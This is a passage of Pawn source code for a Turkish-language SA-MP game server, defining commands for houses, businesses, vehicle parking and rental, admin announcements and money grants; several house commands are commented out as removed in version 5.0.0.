							AHouseData[HouseID][HouseZ] = z;
							AHouseData[HouseID][HouseLevel] = 1;
							AHouseData[HouseID][HouseMaxLevel] = MaxLevel;
							AHouseData[HouseID][HousePrice] = MaxLevel * 900000;
							AHouseData[HouseID][Owned] = false;

							// Add the pickup and 3DText at the location of the house-entrance (where the player is standing when he creates the house)
							House_CreateEntrance(HouseID);

							// Save the house
							HouseFile_Save(HouseID);

							// Inform the player that he created a new house
							format(Msg, 128, "{00FF00}You've succesfully created house {FF00FF}%i{00FF00}", HouseID);
							SendClientMessage(playerid, 0xFFFFFFFF, Msg);
						}
						else
						    SendClientMessage(playerid, 0xFF0000FF, "The maximum amount of houses has been reached");
					}
					else
					    SendClientMessage(playerid, 0xFF0000FF, "You have to use a max-level from 1 to 12");
				}
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "You can't be inside a vehicle to create a house");
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	*/
	return 1;
}



// This command lets the player delete a house
CMD:evsil(playerid, params[])
{
SendClientMessage(playerid, -1, "{80FFFF}Bu komut V5.0.0'dan itibaren {F8F8FF}Yeni Ev Sistemi {80FFFF}nedeniyle kaldýrýlmýþtýr.");
/*
	// Setup local variables
	new file[100], Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/evsil", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 7
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			// Make sure the player isn't inside a vehicle
			if (GetPlayerVehicleID(playerid) == 0)
			{
				// Loop through all player-owned houses
				for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
				{
					// Check if the house exists
					if (AHouseData[HouseID][PickupID] != 0)
					{
						// Check if the house has no owner
						if (AHouseData[HouseID][Owned] == false)
						{
							// Check if the player is in range of the house-pickup
							if (IsPlayerInRangeOfPoint(playerid, 2.5, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]))
							{
								// Clear all data of the house
	                            AHouseData[HouseID][HouseName] = 0;
	                            AHouseData[HouseID][Insurance] = 0;
	                            AHouseData[HouseID][HouseX] = 0.0;
	                            AHouseData[HouseID][HouseY] = 0.0;
	                            AHouseData[HouseID][HouseZ] = 0.0;
	                            AHouseData[HouseID][HouseLevel] = 0;
	                            AHouseData[HouseID][HouseMaxLevel] = 0;
	                            AHouseData[HouseID][HousePrice] = 0;
	                            AHouseData[HouseID][Owned] = false;
	                            AHouseData[HouseID][Owner] = 0;
	                            AHouseData[HouseID][HouseName] = 0;
	                            AHouseData[HouseID][HouseName] = 0;
	                            AHouseData[HouseID][HouseName] = 0;
								// Destroy the mapicon, 3DText and pickup for the house
								DestroyDynamicPickup(AHouseData[HouseID][PickupID]);
								DestroyDynamicMapIcon(AHouseData[HouseID][MapIconID]);
								DestroyDynamic3DTextLabel(AHouseData[HouseID][DoorText]);
	                            AHouseData[HouseID][PickupID] = 0;
	                            AHouseData[HouseID][MapIconID] = 0;

								// Delete the House-file
								format(file, sizeof(file), HouseFile, HouseID); // Construct the complete filename for this house-file
								if (fexist(file)) // Make sure the file exists
									fremove(file); // Delete the file

								// Also let the player know he deleted the house
								format(Msg, 128, "{00FF00}You have deleted the house with ID: {FFFF00}%i", HouseID);
								SendClientMessage(playerid, 0xFFFFFFFF, Msg);

								// Exit the function
								return 1;
							}
						}
					}
				}

				// There was no house in range, so let the player know about it
				SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}No house in range to delete");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You can't be inside a vehicle to delete a house");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	*/
	return 1;
}





// This command lets the player buy a house when he's standing in range of a house that isn't owned yet
CMD:eval(playerid, params[])
{
SendClientMessage(playerid, -1, "{80FFFF}Bu komut V5.0.0'dan itibaren {F8F8FF}Yeni Ev Sistemi {80FFFF}nedeniyle kaldýrýlmýþtýr.");

/*
	// Setup local variables
	new Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/eval", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Make sure the player isn't inside a vehicle
		if (GetPlayerVehicleID(playerid) == 0)
		{
		    if(Player_CountHouses(playerid) == MAX_HOUSESPERPLAYER) return SendClientMessage(playerid, 0xFF0000FF, "Ev alma sýnýrýna ulaþmýþsýnýz!");

			// Check if the player is near a house-pickup
			for (new i = 1; i < sizeof(AHouseData); i++)
			{
				// Check if this house is created (it would have a valid pickup in front of the door)
				if (AHouseData[i][PickupID] != 0)
				{
					// Check if the player is in range of the house-pickup
					if (IsPlayerInRangeOfPoint(playerid, 2.5, AHouseData[i][HouseX], AHouseData[i][HouseY], AHouseData[i][HouseZ]))
					{
					    // Check if the house isn't owned yet
					    if (AHouseData[i][Owned] == false)
					    {
					        // Check if the player can afford this house
					        if (APlayerData[playerid][PlayerMoney] >= AHouseData[i][HousePrice])
					        {
					            House_SetOwner(playerid, i); // Give ownership of the house to the player
					            GivePlayerAchievement(playerid, EvimAch, 1); // Baþarým Sistemi
							}
					        else
					            SendClientMessage(playerid, 0xFF0000FF, "Bu evi Alacak Paran yok"); // The player cannot afford this house
					    }
					    else
					    {
					        // Let the player know that this house is already owned by a player
							format(Msg, 128, "{FF0000}Bu ev zaten satildi. Sahibi {00FF00}%s{FFFFFF}", AHouseData[i][Owner]);
							SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					    }

						// The player was in range of a house-pickup, so stop searching for the other house pickups
					    return 1;
					}
				}
			}

			// All houses have been processed, but the player wasn't in range of any house-pickup, let him know about it
			SendClientMessage(playerid, 0xFF0000FF, "Ev almak icin evin yakininda olmalisin");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Aracin icindeyken Ev alamassin");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	*/
	return 1;
}


CMD:setallworld(playerid,params[])
{

	SendAdminText(playerid, "/setallworld", params);

    if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
	{
		for(new i=0; i < MAX_PLAYERS;i++)
		{
			// Check if the player has logged in
			if (APlayerData[i][LoggedIn] == true)
			{
			SetPlayerVirtualWorld(i, 1000);
			}
		}
  	}

return 1;
}
// This command lets the player enter the house/business if he's the owner
CMD:icerigir(playerid, params[])
{
	// Setup local variables
	new HouseID, hLevel, BusID, BusType;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/icerigir", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Make sure the player isn't inside a vehicle
		if (GetPlayerVehicleID(playerid) == 0)
		{
			// Loop through all houses
			for (HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
			{
				// Check if this house exists
				if (AHouseData[HouseID][PickupID] != 0)
				{
					// Check if the player is in range of the house-pickup
					if (IsPlayerInRangeOfPoint(playerid, 2.5, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]))
					{
						// Check if the house is closed to the public
						if (AHouseData[HouseID][HouseOpened] == false)
						{
							// The house isn't open to the public, so keep anyone out who isn't the owner of the house
							if (House_PlayerIsOwner(playerid, HouseID) == 0)
							{
							    // Let the player know that this house isn't open to the public and he can't enter it
								SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bu ev kilitli, giremezsiniz");
							    return 1;
							}
						}

						// The house is open to the public, or the player trying to enter is the owner, so let the player inside the house

					    // Get the level of the house
						hLevel = AHouseData[HouseID][HouseLevel];
						// Set the worldid so other players cannot see him anymore
						SetPlayerVirtualWorld(playerid, 5000 + HouseID);
						// Set the player inside the interior of the house
						SetPlayerInterior(playerid, AHouseInteriors[hLevel][InteriorID]);
						// Set the position of the player at the spawn-location of the house's interior
						SetPlayerPos(playerid, AHouseInteriors[hLevel][IntX], AHouseInteriors[hLevel][IntY], AHouseInteriors[hLevel][IntZ]);
						// Also set a tracking-variable to enable /housemenu to track in which house the player is
						APlayerData[playerid][CurrentHouse] = HouseID;
						// Also let the player know he can use /housemenu to upgrade/exit his house
						SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Eviniz ile ilgili ayarlari degistirmek icin {FFFF00}/evmenu{00FF00} komutunu kullanýnýz.");

						// Exit the function
						return 1;
					}
				}
			}

   // Loop through all player-owned businesses
			for (BusID = 1; BusID < MAX_BUSINESS; BusID++)
			{
       // Get the business-id at the selected slot from the player
			   // BusID = APlayerData[playerid][Business][i];

				// Check if the player has owned a business in this slot
				if (BusID != 0)
				{
					// Check if the player is in range of the business-pickup
					if (IsPlayerInRangeOfPoint(playerid, 2.5, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]))
					{

						if (Business_PlayerIsOwner(playerid, BusID) == 0)
						{
       						isyerimdeyim[playerid] = 2; // ziyaretci
						}
						else
						{
						    isyerimdeyim[playerid] = 1; // sahip
						}

						// Get the business-type
					    BusType = ABusinessData[BusID][BusinessType];
						// Set the worldid so other players cannot see him anymore
						SetPlayerVirtualWorld(playerid, 1000);
						// Set the player inside the interior of the business
						SetPlayerInterior(playerid, ABusinessInteriors[BusType][InteriorID]);

						// Set the position of the player at the spawn-location of the business's interior
						SetPlayerPos(playerid, ABusinessInteriors[BusType][IntX], ABusinessInteriors[BusType][IntY], ABusinessInteriors[BusType][IntZ]);
						// Also set a tracking-variable to enable /busmenu to track in which business the player is
						APlayerData[playerid][CurrentBusiness] = BusID;
						// Also let the player know he can use /busmenu to upgrade/exit his business
						SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Ýsyeri Ayarlari Ýcin  {FFFF00}' /isyerimenu '{00FF00}");





						// Exit the function
						return 1;
					}
    			}
			}

			// VIP Lounge
			if(IsPlayerInRangeOfPoint(playerid, 3.0, 334.1600, -1823.1455, 4.6207))
			{
			    if(!IsPlayerInAnyVehicle(playerid))
			    {
					if(APlayerData[playerid][PlayerDonLevel] == 0) return SendClientMessage(playerid, -1, "{FF0000}Buraya sadece Donator'ler girebilir!");
					SetPlayerPos(playerid, -4107.2471, 906.1700, 3.1007);
					SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Donator Mekaný'na hoþ geldiniz!");
			    }
			}

			if(IsPlayerInRangeOfPoint(playerid, 3.0, -4107.2471, 906.1700, 3.1007))
			{
			    if(!IsPlayerInAnyVehicle(playerid))
			    {
					if(APlayerData[playerid][PlayerDonLevel] == 0) return SendClientMessage(playerid, -1, "{FF0000}Buraya sadece Donator'ler girebilir!");
					if(HusoEvde[playerid] == false) SetPlayerPos(playerid, 334.1600, -1823.1455, 4.6207);
					if(HusoEvde[playerid] == true) SetPlayerPos(playerid, 495.3529, -1934.8323, 12.7938);
					HusoEvde[playerid] = false;
					SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Donator Mekaný'nndan ayrýldýnýz.");
			    }
			}

			// huseyin Santa Maria Beach Mansion
			if(IsPlayerInRangeOfPoint(playerid, 3.0, 495.3529, -1934.8323, 12.7938))
			{
			    if(!IsPlayerInAnyVehicle(playerid))
			    {
					if(APlayerData[playerid][PlayerDonLevel] == 0) return SendClientMessage(playerid, -1, "{FF0000}Buraya sadece huseyin girebilir!");
					if(!strcmp("huseyin", GetName(playerid), true))
					{
						SetPlayerPos(playerid, -4107.2471, 906.1700, 3.1007);
						HusoEvde[playerid] = true;
						SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Donator Mekaný'na hoþ geldin Hüseyin!");
					}else{
					    SendClientMessage(playerid, -1, "{FF0000}Buraya sadece huseyin girebilir!");
					}
				}
			}
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
// This command opens a menu when you're inside your house to allow to access the options of your house
CMD:evmenu(playerid, params[])
{
	// Setup local variables
	new OptionsList[200], DialogTitle[200];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/evmenu", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is inside a house
		if (APlayerData[playerid][CurrentHouse] != 0)
		{
			format(DialogTitle, sizeof(DialogTitle), "Seciniz : %s", AHouseData[APlayerData[playerid][CurrentHouse]][HouseName]);

			format(OptionsList, sizeof(OptionsList), "%sEv Ismini Degistir\n", OptionsList);
			format(OptionsList, sizeof(OptionsList), "%sEvi Gelistir\n", OptionsList);
			format(OptionsList, sizeof(OptionsList), "%sEvi Sat\n", OptionsList);
			format(OptionsList, sizeof(OptionsList), "%sEvin Girislerini Herkeze Ac\n", OptionsList);
			format(OptionsList, sizeof(OptionsList), "%sEvi Girislerini Herkeze Kapat\n", OptionsList);
			format(OptionsList, sizeof(OptionsList), "%sEvden Cik\n", OptionsList);
			// Show the housemenu
			ShowPlayerDialog(playerid, DialogHouseMenu, DIALOG_STYLE_LIST, DialogTitle, OptionsList, "Tamam", "Iptal");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "{FFCC00}» {FFFFFF}Evin Icýnde Degilsin");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



// This command allows you to port a vehicle from your house to your location
CMD:getcar(playerid, params[])
{
	SendClientMessage(playerid, -1, "{80FFFF}Bu komut V5.0.0'dan itibaren {F8F8FF}Araç Sahiplik Sistemi {80FFFF}nedeniyle kaldýrýlmýþtýr.");
	/*// Setup local variables
	new HouseList[1000];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/getcar", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
        if(APlayerData[playerid][JobStarted] == true) return SendClientMessage(playerid, -1, "{FF0000}Görevdeyken bu komutu kullanamazsiniz!");
        //if (APlayerData[playerid][PlayerClass] == ClassPboy) return SendClientMessage(playerid, -1, "{FF0000}Pizzacida kullanamasiniz!");
		// Check if the player is not jailed
		if (APlayerData[playerid][PlayerJailed] == 0)
		{
			// Check if the player is not inside a vehicle
			if (GetPlayerVehicleID(playerid) == 0)
			{
			    //if(SamanKulesiKatildi[playerid] == 1) return SendClientMessage(playerid, 0xFF0000FF, "saman kulesinde arac cekmek yasak");
                Player_LoadHouses(playerid);
				// Ask to which house the player wants to add his vehicle
				for (new i; i < MAX_HOUSESPERPLAYER; i++)
				{
					// Check if this houseindex is occupied
					if (APlayerData[playerid][Houses][i] != 0)
						format(HouseList, 1000, "%s{00FF00}%s{FFFFFF}\n", HouseList, AHouseData[APlayerData[playerid][Houses][i]][HouseName]);
					else
						format(HouseList, 1000, "%s{FFFFFF}%s{FFFFFF}\n", HouseList, "Boþ Ev Slotu");
				}
				ShowPlayerDialog(playerid, DialogGetCarSelectHouse, DIALOG_STYLE_LIST, "Çekilecek Aracýn Bulunduðu Ev:", HouseList, "Seç", "Ýptal");
			}
			else
				SendClientMessage(playerid, 0xFF0000FF, "Yanýna araç çekmek için ayakta olmalýsýnýz");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Hapisteyken bu komutu kullanamazsýnýz");
	}
	else
	    return 0;

	// Let the server know that this was a valid command*/
	return 1;
}

// This command checks if the player is inside a vehicle that he owns and if he's in range of the house where the vehicle is assigned to
CMD:park(playerid, params[])
{
	// Setup local variables
	new Float:x, Float:y, Float:z, Float:rot, vid, HouseID, Msg[128];
	new engine,lights,alarm,doors,bonnet,boot,objective;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/park", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is inside a vehicle (he must be the driver)
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
			// Get the vehicle-id
			vid = GetPlayerVehicleID(playerid);
			// Get the HouseID to which this vehicle belongs
			HouseID = AVehicleData[vid][BelongsToHouse];

			// Check if the vehicle is owned (owner-check is not really required, as another player would get kicked out very fast)
			// AND it must belong to a house that the player owns
			if ((AVehicleData[vid][Owned] == true) && (HouseID != 0))
			{
				// Check if the vehicle is in range of the house-entrance (you cannot park a vehicle further away from your house than 150m)
				if (IsPlayerInRangeOfPoint(playerid, ParkRange, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]))
				{
					// Get the player's position and angle
					GetVehiclePos(vid, x, y, z);
					GetVehicleZAngle(vid, rot);
					// Save those values for the vehicle
					AVehicleData[vid][SpawnX] = x;
					AVehicleData[vid][SpawnY] = y;
					AVehicleData[vid][SpawnZ] = z;
					AVehicleData[vid][SpawnRot] = rot;

					// Find the vehicle in the player's houses
					Player_LoadHouses(playerid);
					for (new i; i < MAX_HOUSESPERPLAYER; i++)
					{
						// Get the HouseID of the current house
					    HouseID = APlayerData[playerid][Houses][i];

						// Loop through all carslots of this house to find the vehicle-id
						for (new CarSlot; CarSlot < 11; CarSlot++)
						{
							// Check if this carslot holds the same vehicle-id
						    if (AHouseData[HouseID][VehicleIDs][CarSlot] == vid)
						    {
			                    House_ReplaceVehicle(HouseID, CarSlot); // Re-create the vehicle at the same spot the player wants to park his vehicle
			                    PutPlayerInVehicle(playerid, AHouseData[HouseID][VehicleIDs][CarSlot], 0);
								// Turn on the engine
								GetVehicleParamsEx(AHouseData[HouseID][VehicleIDs][CarSlot], engine, lights, alarm, doors, bonnet, boot, objective);
								SetVehicleParamsEx(AHouseData[HouseID][VehicleIDs][CarSlot], engine, lights, alarm, doors, bonnet, boot, objective);
                                HouseFile_Save(HouseID);
								break; // Stop the for-loop
							}
						}
					}

					// Let the player know he parked his vehicle
					SendClientMessage(playerid, 0x00FF00FF, "{FFCC00}» {FFFFFF}Aracýnýzý park ettiniz");

					// Save the player-file (and his houses)
					Oyuncu_Kaydet(playerid);
				}
				else
				{
				    format(Msg, 128, "{FF0000}Aracýnýzý evinizden en fazla %im mesafeye park edebilirsiniz", ParkRange);
				    SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				}
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "Kendinize ait olmayan bir aracý park edemezsiniz");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Araç park etmek için onu sürüyor olmalýsýnýz");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Lets the player rent a vehicle
CMD:rentcar(playerid, params[])
{
	// Setup local variables
	new VehicleClassList[1000];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/rentcar", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Make sure the player isn't inside a vehicle
		if (GetPlayerVehicleID(playerid) == 0)
		{
			// Check if the player is near a cardealerpickup
			for (new i; i < sizeof(ACarDealerPickups); i++)
			{
				// Check if a valid cardealerpickup is found
				if (ACarDealerPickups[i][PickupID] != 0)
				{
					// Check if the player is in range of the cardealerpickup
					if(IsPlayerInRangeOfPoint(playerid, 2.5, ACarDealerPickups[i][pux], ACarDealerPickups[i][puy], ACarDealerPickups[i][puz]))
					{
					    // Let the player choose a vehicle-class
						format(VehicleClassList, 1000, "%s{00FF00}%s{FFFFFF}\n", VehicleClassList, "Bikes");
						format(VehicleClassList, 1000, "%s{40FF00}%s{FFFFFF}\n", VehicleClassList, "Boats");
						format(VehicleClassList, 1000, "%s{80FF00}%s{FFFFFF}\n", VehicleClassList, "Convertibles");
						format(VehicleClassList, 1000, "%s{B0FF00}%s{FFFFFF}\n", VehicleClassList, "Helicopters");
						format(VehicleClassList, 1000, "%s{FFFF00}%s{FFFFFF}\n", VehicleClassList, "Industrial vehicles");
						format(VehicleClassList, 1000, "%s{B0FF40}%s{FFFFFF}\n", VehicleClassList, "Low-riders");
						format(VehicleClassList, 1000, "%s{80FF80}%s{FFFFFF}\n", VehicleClassList, "Off-Road vehicles");
						format(VehicleClassList, 1000, "%s{40FFB0}%s{FFFFFF}\n", VehicleClassList, "Planes");
						format(VehicleClassList, 1000, "%s{00FFFF}%s{FFFFFF}\n", VehicleClassList, "Public Service vehicles");
						format(VehicleClassList, 1000, "%s{00B0FF}%s{FFFFFF}\n", VehicleClassList, "RC vehicles");
						format(VehicleClassList, 1000, "%s{0080FF}%s{FFFFFF}\n", VehicleClassList, "Saloon vehicles");
						format(VehicleClassList, 1000, "%s{0040FF}%s{FFFFFF}\n", VehicleClassList, "Sport vehicles");
						format(VehicleClassList, 1000, "%s{0000FF}%s{FFFFFF}\n", VehicleClassList, "Station wagons");
						format(VehicleClassList, 1000, "%s{4000FF}%s{FFFFFF}\n", VehicleClassList, "Trailers");
						format(VehicleClassList, 1000, "%s{8000FF}%s{FFFFFF}\n", VehicleClassList, "Unique vehicles");
						// Ask which vehicle class the player wants to see to buy a vehicle
						ShowPlayerDialog(playerid, DialogRentCarClass, DIALOG_STYLE_LIST, "Araç sýnýfý seç:", VehicleClassList, "Seç", "Ýptal");
						// Exit the function
						return 1;
					}
				}
			}

			// The player wasn't in range of a cardealer
			SendClientMessage(playerid, 0xFF0000FF, "Araç kiralama yerinde deðilsiniz");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Araç içindeyken araç kiralayamazsýnýz");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}






CMD:duyuru(playerid, params[])
{
	new duyuru[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/duyuru", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 4
		if (APlayerData[playerid][PlayerLevel] >= 2 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] > 1)
		{
			if (sscanf(params, "s[128]", duyuru)) SendSyntaxMessage(playerid, "/Duyuru <Duyuru>");
			else
			{
 				GameTextForAll(duyuru,4000,3);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

CMD:asay(playerid, params[])
{
	new duyuru[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/asay", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 4
		if (APlayerData[playerid][PlayerLevel] >= 2 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] >= 1 || APlayerData[playerid][PlayerDjLevel] >= 1)
		{
			if (sscanf(params, "s[128]", duyuru)) SendSyntaxMessage(playerid, "/asay <duyuru>");
			else
			{
				new Yazi[300];
				if(APlayerData[playerid][PlayerRehberLevel] >= 1)
				{
				    format(Yazi, 300, "{7FFFD4}REHBER %s(%d): %s", GetName(playerid), playerid, duyuru);
				}else
				if(APlayerData[playerid][PlayerDjLevel] >= 1)
				{
				    format(Yazi, 300, "{7FFFD4}DJ %s(%d): %s", GetName(playerid), playerid, duyuru);
				}else{
				    format(Yazi, 300, "{7FFFD4}ADMIN %s(%d): %s", GetName(playerid), playerid, duyuru);
				}
				SendClientMessageToAll(-1,Yazi);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}
CMD:asay2(playerid, params[])
{
	new duyuru[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/asay2", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 4
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] == 1 || APlayerData[playerid][PlayerDjLevel] >= 1)
		{
			if (sscanf(params, "s[128]", duyuru)) SendClientMessage(playerid, 0xFF0000AA, "Usage: \"/asay2 <duyuru>\"");
			else
			{
				new Yazi[300];
				if(APlayerData[playerid][PlayerRehberLevel] == 1)
				{
				    format(Yazi, 300, "~b~~h~REHBER ~w~ %s(%d): %s", GetName(playerid), playerid, duyuru);
				}else
				if(APlayerData[playerid][PlayerDjLevel] >= 1)
				{
				    format(Yazi, 300, "~b~~h~DJ~w~ %s(%d): %s", GetName(playerid), playerid, duyuru);
				}else{
				    format(Yazi, 300, "~b~~h~ADMIN ~w~%s(%d): %s", GetName(playerid), playerid, duyuru);
				}
		 		   SendDuyuruText(Yazi);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}
CMD:dtemizle(playerid, params[])
{

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/dtemizle", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 4
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] > 2 || APlayerData[playerid][PlayerDjLevel] >= 1)
		{
			if (sscanf(params, "s[128]")) SendClientMessage(playerid, 0xFF0000AA, "Usage: \"/asay2\"");
			else
			{
				new Yazi[300];
				if(APlayerData[playerid][PlayerRehberLevel] > 2)
				{
				    format(Yazi, 300, "~r~~h~REHBER ~w~ %s(%d)   Duyuru EkranInI TemIzledI  ", GetName(playerid), playerid);
				    SendDuyuruText(Yazi);
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
				}else
				if(APlayerData[playerid][PlayerDjLevel] == 1)
				{
				    format(Yazi, 300, "~r~~h~DJ~w~ %s(%d) Duyuru EkranInI TemIzledI", GetName(playerid), playerid);
				    SendDuyuruText(Yazi);
				    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
				}else{
  				    format(Yazi, 300, "~r~~h~ADMIN ~w~%s(%d) Duyuru EkranInI TemIzledI", GetName(playerid), playerid);
				    SendDuyuruText(Yazi);
				   	SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
                    SendDuyuruText(" ");
				}

			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}
// Gives the player the cash he requests
CMD:apara(playerid, params[])
{
	new Amount, Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/apara", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 4
		if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
		{
			if (sscanf(params, "i", Amount)) SendSyntaxMessage(playerid, "/apara <miktar>");
			else
			{
				// Check if the player gave himself too much at once
				if (Amount > 100000000)
				{
				    // Inform the player and quit the command
					SendClientMessage(playerid, 0xFF0000AA, "You cannot give yourself more than 100M at once");
					return 1;
				}

				// Reward the player (give cash and points)
				RewardPlayer(playerid, Amount, 0);
				format(Msg, 128, "You have earned $%i", Amount);
				SendClientMessage(playerid, 0x00FF00AA, Msg);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// Gives the player the cash he requests
CMD:score(playerid, params[])
{
	new Amount, Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/score", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 4
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "i", Amount)) SendSyntaxMessage(playerid, "/score <miktar>");
			else
			{
				// Reward the player (give cash and points)
				RewardPlayer(playerid, 0, Amount);
				format(Msg, 128, "You have earned %i scorepoints", Amount);
				SendClientMessage(playerid, 0x00FF00AA, Msg);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// Detaches the trailer from the vehicle
CMD:kasabirak(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/kasabirak", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    if(APlayerData[playerid][InConvoy] == true)
	    {
			new pConvoy = APlayerData[playerid][ConvoyID];
 			new LeaderID = AConvoys[pConvoy][Members][0];
			if(APlayerData[LeaderID][JobStarted] == false)
			{
				if(AConvoys[pConvoy][ConvoyStep] == 0 || AConvoys[pConvoy][ConvoyStep] == 1)
				{
				    SendClientMessage(playerid, -1, "Konvoy lideriniz görevi baþlatmadan bu komutu kullanamazsýnýz!");
				    return 1;
				}
			}
		}
		// Detach the trailer from the vehicle
		DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
		// Send the player a message that the trailer has been detached
		SendClientMessage(playerid, 0x0000FFFF, "Kasaný Biraktin");
	}
	else
		return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:flip(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/flip", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		// Setup some local variables
		new Float:x = 0.0, Float:y = 0.0, Float:z = 0.0;
		// Check if the player is inside a vehicle
		if(IsPlayerInAnyVehicle(playerid))
			SetCameraBehindPlayer(playerid);
		// Get the player's position
		GetPlayerPos(playerid, x, y, z);
		// Set the vehicle on the player's coordinates
		SetVehiclePos(GetPlayerVehicleID(playerid), x, y, z);
		// Let the vehicle point north
		SetVehicleZAngle(GetPlayerVehicleID(playerid), 0.0);
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Puts the player's vehicle back onto his wheels
CMD:cevir(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/cevir", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	/* KONVOY BUGU FÝX DENEME
	    if(APlayerData[playerid][InConvoy] == true)
	    {
			new pConvoy = APlayerData[playerid][ConvoyID];
 			new LeaderID = AConvoys[pConvoy][Members][0];
			if(APlayerData[LeaderID][JobStarted] == false)
			{
